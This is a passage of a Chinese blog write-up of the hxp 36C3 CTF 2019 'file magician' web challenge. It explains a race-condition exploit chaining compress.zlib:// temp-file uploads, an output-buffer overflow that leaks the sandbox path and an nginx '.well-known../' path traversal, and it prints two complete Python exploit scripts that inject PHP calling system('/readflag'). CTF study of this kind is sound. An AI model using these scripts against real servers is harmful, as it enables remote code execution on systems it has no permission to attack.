<h6 id="这个地方问了很多师傅，并且参考了主要的公开WP，基本都是利用两个函数之间极端的时间窗进行绕过。"><a href="#这个地方问了很多师傅，并且参考了主要的公开WP，基本都是利用两个函数之间极端的时间窗进行绕过。" class="headerlink" title="这个地方问了很多师傅，并且参考了主要的公开WP，基本都是利用两个函数之间极端的时间窗进行绕过。"></a>这个地方问了很多师傅，并且参考了主要的公开WP，基本都是利用两个函数之间极端的时间窗进行绕过。</h6><h6 id="什么意思呢？也就是说，在极其理想的情况下，我们通过自己的服务先发送一段垃圾数据，这时候通过stripos的判断就是没有PHP代码的文件数据，接着我们利用HTTP长链接的形式，只要这个链接不断开，在我们绕过第一个判断之后，我们就可以发送第二段含有PHP代码的数据了，这样就能使include-once包含我们的代码了。"><a href="#什么意思呢？也就是说，在极其理想的情况下，我们通过自己的服务先发送一段垃圾数据，这时候通过stripos的判断就是没有PHP代码的文件数据，接着我们利用HTTP长链接的形式，只要这个链接不断开，在我们绕过第一个判断之后，我们就可以发送第二段含有PHP代码的数据了，这样就能使include-once包含我们的代码了。" class="headerlink" title="什么意思呢？也就是说，在极其理想的情况下，我们通过自己的服务先发送一段垃圾数据，这时候通过stripos的判断就是没有PHP代码的文件数据，接着我们利用HTTP长链接的形式，只要这个链接不断开，在我们绕过第一个判断之后，我们就可以发送第二段含有PHP代码的数据了，这样就能使include_once包含我们的代码了。"></a>什么意思呢？也就是说，在极其理想的情况下，我们通过自己的服务先发送一段垃圾数据，这时候通过<code>stripos</code>的判断就是没有PHP代码的文件数据，接着我们利用HTTP长链接的形式，只要这个链接不断开，在我们绕过第一个判断之后，我们就可以发送第二段含有PHP代码的数据了，这样就能使<code>include_once</code>包含我们的代码了。</h6><h6 id="因为我们无法知道什么时候能绕过第一个判断，所以这里的方法只能利用竞争的形式去包含临时文件，这里是第二个我们需要竞争的点。"><a href="#因为我们无法知道什么时候能绕过第一个判断，所以这里的方法只能利用竞争的形式去包含临时文件，这里是第二个我们需要竞争的点。" class="headerlink" title="因为我们无法知道什么时候能绕过第一个判断，所以这里的方法只能利用竞争的形式去包含临时文件，这里是第二个我们需要竞争的点。"></a>因为我们无法知道什么时候能绕过第一个判断，所以这里的方法只能利用竞争的形式去包含临时文件，这里是第二个我们需要竞争的点。</h6><h6 id="Leak-Dir-path"><a href="#Leak-Dir-path" class="headerlink" title="Leak Dir path"></a>Leak Dir path</h6><h6 id="最后，要做到文件包含，自然得先知道它的文件路径，而文件路径每次都是随机的，所以我们又不得不通过某些方式去获取路径。"><a href="#最后，要做到文件包含，自然得先知道它的文件路径，而文件路径每次都是随机的，所以我们又不得不通过某些方式去获取路径。" class="headerlink" title="最后，要做到文件包含，自然得先知道它的文件路径，而文件路径每次都是随机的，所以我们又不得不通过某些方式去获取路径。"></a>最后，要做到文件包含，自然得先知道它的文件路径，而文件路径每次都是随机的，所以我们又不得不通过某些方式去获取路径。</h6><h6 id="虽然我们可以直接看到题目是直接给出了路径，但是乍一看代码我们貌似只能等到全部函数结束之后才能拿到路径，然而之前我们说到的需要保留的长链接不能让我们立即得到我们的sandbox路径。"><a href="#虽然我们可以直接看到题目是直接给出了路径，但是乍一看代码我们貌似只能等到全部函数结束之后才能拿到路径，然而之前我们说到的需要保留的长链接不能让我们立即得到我们的sandbox路径。" class="headerlink" title="虽然我们可以直接看到题目是直接给出了路径，但是乍一看代码我们貌似只能等到全部函数结束之后才能拿到路径，然而之前我们说到的需要保留的长链接不能让我们立即得到我们的sandbox路径。"></a>虽然我们可以直接看到题目是直接给出了路径，但是乍一看代码我们貌似只能等到全部函数结束之后才能拿到路径，然而之前我们说到的需要保留的长链接不能让我们立即得到我们的sandbox路径。</h6><h6 id="所以我们需要通过传入过大的name参数，导致PHP-output-buffer溢出，在保持连接的情况下获取沙箱路径，参考代码："><a href="#所以我们需要通过传入过大的name参数，导致PHP-output-buffer溢出，在保持连接的情况下获取沙箱路径，参考代码：" class="headerlink" title="所以我们需要通过传入过大的name参数，导致PHP output buffer溢出，在保持连接的情况下获取沙箱路径，参考代码："></a>所以我们需要通过传入过大的name参数，导致PHP output buffer溢出，在保持连接的情况下获取沙箱路径，参考代码：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    data = <span class="string">'''file=compress.zlib://http://192.168.151.132:8080&amp;name='''</span>.strip() + <span class="string">'a'</span> * (<span class="number">1024</span> * <span class="number">7</span> + <span class="number">882</span>)</span><br><span class="line">    r.send(<span class="string">'''POST / HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: localhost\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;\r</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=asdasdasd\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#123;&#125;\r</span></span><br><span class="line"><span class="string">'''</span>.format(len(data), data))</span><br></pre></td></tr></table></figure>

<h6 id="GET-Flag"><a href="#GET-Flag" class="headerlink" title="GET Flag"></a>GET Flag</h6><h6 id="所以整个流程我们可以总结为以下："><a href="#所以整个流程我们可以总结为以下：" class="headerlink" title="所以整个流程我们可以总结为以下："></a>所以整个流程我们可以总结为以下：</h6><h6 id="1-利用compress-zlib-http-或者compress-zlib-ftp-来上传任意文件，并保持-HTTP-长链接竞争保存我们的临时文件"><a href="#1-利用compress-zlib-http-或者compress-zlib-ftp-来上传任意文件，并保持-HTTP-长链接竞争保存我们的临时文件" class="headerlink" title="1.利用compress.zlib://http://或者compress.zlib://ftp://来上传任意文件，并保持 HTTP 长链接竞争保存我们的临时文件"></a>1.利用<code>compress.zlib://http://</code>或者<code>compress.zlib://ftp://</code>来上传任意文件，并保持 HTTP 长链接竞争保存我们的临时文件</h6><h6 id="2-利用超长的-name-溢出-output-buffer-得到-sandbox-路径"><a href="#2-利用超长的-name-溢出-output-buffer-得到-sandbox-路径" class="headerlink" title="2.利用超长的 name 溢出 output buffer 得到 sandbox 路径"></a>2.利用超长的 name 溢出 output buffer 得到 sandbox 路径</h6><h6 id="3-利用-Nginx-配置错误，通过-well-known-files-sandbox-来获取我们-tmp-文件的文件名"><a href="#3-利用-Nginx-配置错误，通过-well-known-files-sandbox-来获取我们-tmp-文件的文件名" class="headerlink" title="3.利用 Nginx 配置错误，通过.well-known../files/sandbox/来获取我们 tmp 文件的文件名"></a>3.利用 Nginx 配置错误，通过<code>.well-known../files/sandbox/</code>来获取我们 tmp 文件的文件名</h6><h6 id="4-发送另一个请求包含我们的-tmp-文件，此时并没有-PHP-代码"><a href="#4-发送另一个请求包含我们的-tmp-文件，此时并没有-PHP-代码" class="headerlink" title="4.发送另一个请求包含我们的 tmp 文件，此时并没有 PHP 代码"></a>4.发送另一个请求包含我们的 tmp 文件，此时并没有 PHP 代码</h6><h6 id="5-绕过-WAF-判断后，发送-PHP-代码段，包含我们的-PHP-代码拿到-Flag"><a href="#5-绕过-WAF-判断后，发送-PHP-代码段，包含我们的-PHP-代码拿到-Flag" class="headerlink" title="5.绕过 WAF 判断后，发送 PHP 代码段，包含我们的 PHP 代码拿到 Flag"></a>5.绕过 WAF 判断后，发送 PHP 代码段，包含我们的 PHP 代码拿到 Flag</h6><h6 id="整个题目的关键点主要是以下几点-来自-wupco-："><a href="#整个题目的关键点主要是以下几点-来自-wupco-：" class="headerlink" title="整个题目的关键点主要是以下几点(来自 @wupco)："></a>整个题目的关键点主要是以下几点(来自 @wupco)：</h6><h6 id="要利用大文件或ftp速度限制让连接保持"><a href="#要利用大文件或ftp速度限制让连接保持" class="headerlink" title="要利用大文件或ftp速度限制让连接保持"></a>要利用大文件或ftp速度限制让连接保持</h6><h6 id="传入name过大-overflow-output-buffer，在保持连接的情况下获取沙箱路径"><a href="#传入name过大-overflow-output-buffer，在保持连接的情况下获取沙箱路径" class="headerlink" title="传入name过大 overflow output buffer，在保持连接的情况下获取沙箱路径"></a>传入name过大 overflow output buffer，在保持连接的情况下获取沙箱路径</h6><h6 id="tmp文件需要在两种文件直接疯狂切换，使得第一次file-get-contents获取的内容不带有-lt-include的时候是正常php代码，需要卡时间点，所以要多跑几次才行"><a href="#tmp文件需要在两种文件直接疯狂切换，使得第一次file-get-contents获取的内容不带有-lt-include的时候是正常php代码，需要卡时间点，所以要多跑几次才行" class="headerlink" title="tmp文件需要在两种文件直接疯狂切换，使得第一次file_get_contents获取的内容不带有&lt;?,include的时候是正常php代码，需要卡时间点，所以要多跑几次才行"></a>tmp文件需要在两种文件直接疯狂切换，使得第一次<code>file_get_contents</code>获取的内容不带有<code>&lt;?</code>,<code>include</code>的时候是正常php代码，需要卡时间点，所以要多跑几次才行</h6><h6 id="well-known-files-是nginx配置漏洞，就不多说了，用来列生成的tmp文件"><a href="#well-known-files-是nginx配置漏洞，就不多说了，用来列生成的tmp文件" class="headerlink" title=".well-known../files/是nginx配置漏洞，就不多说了，用来列生成的tmp文件"></a><code>.well-known../files/</code>是nginx配置漏洞，就不多说了，用来列生成的tmp文件</h6><h6 id="由于第二个极短的时间窗，我们需要比较准确地调控延迟时间，之前没调控好时间以及文件大小，挂一晚上脚本都没有-hit-中一次，第二天经过-rebirth-的深刻指点，修改了一下延迟时间以及服务器响应的文件的大小，成功率得到了很大的提高，基本每次都可以-getflag"><a href="#由于第二个极短的时间窗，我们需要比较准确地调控延迟时间，之前没调控好时间以及文件大小，挂一晚上脚本都没有-hit-中一次，第二天经过-rebirth-的深刻指点，修改了一下延迟时间以及服务器响应的文件的大小，成功率得到了很大的提高，基本每次都可以-getflag" class="headerlink" title="由于第二个极短的时间窗，我们需要比较准确地调控延迟时间，之前没调控好时间以及文件大小，挂一晚上脚本都没有 hit 中一次，第二天经过 @rebirth 的深刻指点，修改了一下延迟时间以及服务器响应的文件的大小，成功率得到了很大的提高，基本每次都可以 getflag"></a>由于第二个极短的时间窗，我们需要比较准确地调控延迟时间，之前没调控好时间以及文件大小，挂一晚上脚本都没有 hit 中一次，第二天经过 @rebirth 的深刻指点，修改了一下延迟时间以及服务器响应的文件的大小，成功率得到了很大的提高，基本每次都可以 getflag</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-2.png" alt></p>
<h6 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> gg <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line"></span><br><span class="line">    r = remote(<span class="string">"192.168.220.154"</span>, <span class="number">5478</span>)</span><br><span class="line">    l = listen(<span class="number">5487</span>)</span><br><span class="line"></span><br><span class="line">    data = <span class="string">'''name=&#123;&#125;&amp;file=compress.zlib://http://192.168.220.157:5487'''</span>.format(<span class="string">"a"</span> * <span class="number">8050</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'''POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.220.154:5478</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=asdasdasd</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;'''</span>.format(len(data), data).replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">    r.send(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">'your sandbox: '</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        print(<span class="string">"[ERROR]: EOFERROR"</span>)</span><br><span class="line">        <span class="comment"># l.close()</span></span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># dirname = r.recv(70)</span></span><br><span class="line">    dirname = r.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>) + <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[DEBUG]:"</span> + dirname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send trash</span></span><br><span class="line">    c = l.wait_for_connection()</span><br><span class="line">    resp = <span class="string">'''HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">Date: Sun, 29 Dec 2019 05:22:47 GMT</span></span><br><span class="line"><span class="string">Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string">Vary: Accept-Encoding</span></span><br><span class="line"><span class="string">Content-Length: 534</span></span><br><span class="line"><span class="string">Content-Type: text/html; charset=UTF-8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;'''</span>.format(<span class="string">'A'</span> * <span class="number">5000000</span>).replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">    c.send(resp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get filename</span></span><br><span class="line">    r2 = requests.get(<span class="string">"http://192.168.220.154:5478/.well-known../"</span> + dirname + <span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tmpname = <span class="string">"php"</span> + re.findall(<span class="string">"&gt;php(.*)&lt;\/a"</span>, r2.text)[<span class="number">0</span>]</span><br><span class="line">        print(<span class="string">"[DEBUG]:"</span> + tmpname)</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        l.close()</span><br><span class="line">        r.close()</span><br><span class="line">        print(<span class="string">"[ERROR]: IndexErorr"</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">()</span>:</span></span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        phpcode = <span class="string">'wtf&lt;?php system("/readflag");?&gt;'</span>;</span><br><span class="line">        c.send(phpcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    t = threading.Thread(target=job)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># file_get_contents and include tmp file</span></span><br><span class="line">    exp_file = dirname + <span class="string">"/"</span> + tmpname</span><br><span class="line">    print(<span class="string">"[DEBUG]:"</span> + exp_file)</span><br><span class="line">    r3 = requests.post(<span class="string">"http://192.168.220.154:5478/"</span>, data=&#123;<span class="string">'file'</span>: exp_file&#125;)</span><br><span class="line">    print(r3.status_code, r3.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"wtf"</span> <span class="keyword">in</span> r3.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    t.join()</span><br><span class="line">    r.close()</span><br><span class="line">    l.close()</span><br><span class="line">    <span class="comment"># r.interactive()</span></span><br></pre></td></tr></table></figure>

<h6 id="参考的exp"><a href="#参考的exp" class="headerlink" title="参考的exp"></a>参考的exp</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> gg <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line"></span><br><span class="line">    r = remote(<span class="string">"192.168.220.154"</span>, <span class="number">5478</span>)</span><br><span class="line">    l = listen(<span class="number">5487</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'''POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.220.154:5478</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><br><span class="line"><span class="string">Content-Length: 8104</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">name=&#123;&#125;&amp;file=compress.zlib://http://192.168.220.157:5487'''</span>.format(<span class="string">"a"</span>*<span class="number">8050</span>).replace(<span class="string">"\n"</span>,<span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    r.send(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"your sandbox: "</span>)</span><br><span class="line">    dirname = r.recv(<span class="number">70</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[DEBUG]:"</span> + dirname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send trash</span></span><br><span class="line">    c = l.wait_for_connection()</span><br><span class="line">    resp = <span class="string">'''HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">Date: Sun, 29 Dec 2019 05:22:47 GMT</span></span><br><span class="line"><span class="string">Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string">Vary: Accept-Encoding</span></span><br><span class="line"><span class="string">Content-Length: 5000031</span></span><br><span class="line"><span class="string">Content-Type: text/html; charset=UTF-8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;'''</span>.format(<span class="string">"A"</span>*<span class="number">5000000</span>).replace(<span class="string">"\n"</span>,<span class="string">"\r\n"</span>)</span><br><span class="line">    c.send(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get filename</span></span><br><span class="line">    r2 = requests.get(<span class="string">"http://192.168.220.154:5478/.well-known../"</span>+ dirname + <span class="string">"/"</span>)</span><br><span class="line">    print(<span class="string">"dirname:"</span> + dirname);</span><br><span class="line">    tmpname = <span class="string">"php"</span> + re.findall(<span class="string">"&gt;php(.*)&lt;\/a"</span>,r2.text)[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">"[DEBUG]:"</span> + tmpname)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">()</span>:</span></span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        phpcode = <span class="string">'wtf&lt;?php system("/readflag");?&gt;'</span>;</span><br><span class="line">        c.send(phpcode)</span><br><span class="line"></span><br><span class="line">    t = threading.Thread(target = job)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># file_get_contents and include tmp file</span></span><br><span class="line">    exp_file = dirname + <span class="string">"/"</span> + tmpname</span><br><span class="line">    print(<span class="string">"[DEBUG]:"</span>+exp_file)</span><br><span class="line">    r3 = requests.post(<span class="string">"http://192.168.220.154:5478/"</span>, data=&#123;<span class="string">'file'</span>:exp_file&#125;)</span><br><span class="line">    print(r3.status_code,r3.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"wtf"</span> <span class="keyword">in</span> r3.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    t.join()</span><br><span class="line">    r.close()</span><br><span class="line">    l.close()</span><br><span class="line">    <span class="comment">#r.interactive()</span></span><br></pre></td></tr></table></figure>

<h5 id="References"><a href="#References" class="headerlink" title="References"></a>References</h5><h6 id="https-blog-zeddyu-info-2020-01-08-36c3-web"><a href="#https-blog-zeddyu-info-2020-01-08-36c3-web" class="headerlink" title="https://blog.zeddyu.info/2020/01/08/36c3-web/"></a><a href="https://blog.zeddyu.info/2020/01/08/36c3-web/" target="_blank" rel="noopener">https://blog.zeddyu.info/2020/01/08/36c3-web/</a></h6><h6 id="20191228-hxp36c3ctf"><a href="#20191228-hxp36c3ctf" class="headerlink" title="20191228-hxp36c3ctf"></a><a href="https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/" target="_blank" rel="noopener">20191228-hxp36c3ctf</a></h6><h6 id="https-paste-q3k-org-paste-mp0iN5mw-xy-cOL-ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0"><a href="#https-paste-q3k-org-paste-mp0iN5mw-xy-cOL-ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0" class="headerlink" title="https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0"></a><a href="https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0" target="_blank" rel="noopener">https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0</a></h6><h6 id="https-ctftime-org-task-10211"><a href="#https-ctftime-org-task-10211" class="headerlink" title="https://ctftime.org/task/10211"></a><a href="https://ctftime.org/task/10211" target="_blank" rel="noopener">https://ctftime.org/task/10211</a></h6>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/01/06/2019hack-luCTF的rpdg的环境的搭建到解决的详细过程/" rel="next" title="2019hack.luCTF的rpdg的环境的搭建到解决的详细过程">
                <i class="fa fa-chevron-left"></i> 2019hack.luCTF的rpdg的环境的搭建到解决的详细过程
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/01/16/图片木马制作大法/" rel="prev" title="图片木马制作大法">
                图片木马制作大法 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
            
              <p class="site-author-name" itemprop="name">Ljdd520</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">40</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-FILE-Magician"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x01 FILE Magician</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这道题与其他两道相比算是比较简单的一个了，题目直接给出Docker文件源代码，源代码如下："><span class="nav-number">1.0.1.1.</span> <span class="nav-text">这道题与其他两道相比算是比较简单的一个了，题目直接给出Docker文件源代码，源代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#题目的功能点就是一个简单的文件上传，然后在自己的sandbox当中看到自己的文件类型，文件类型是由-new-finfo-gt-file来判断的，还使用了sqlite进行存储文件上传的记录。"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">题目的功能点就是一个简单的文件上传，然后在自己的sandbox当中看到自己的文件类型，文件类型是由(new finfo)-&gt;file来判断的，还使用了sqlite进行存储文件上传的记录。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由于创建的数据库规定了id为自增长的整型为主键，而且它使用了lastInsertId-返回最后一次insert数据的id作为文件名"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">由于创建的数据库规定了id为自增长的整型为主键，而且它使用了lastInsertId()返回最后一次insert数据的id作为文件名</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以我们基本上可以不用考虑是否存在通过可控文件名上传文件getshell了。"><span class="nav-number">1.0.1.4.</span> 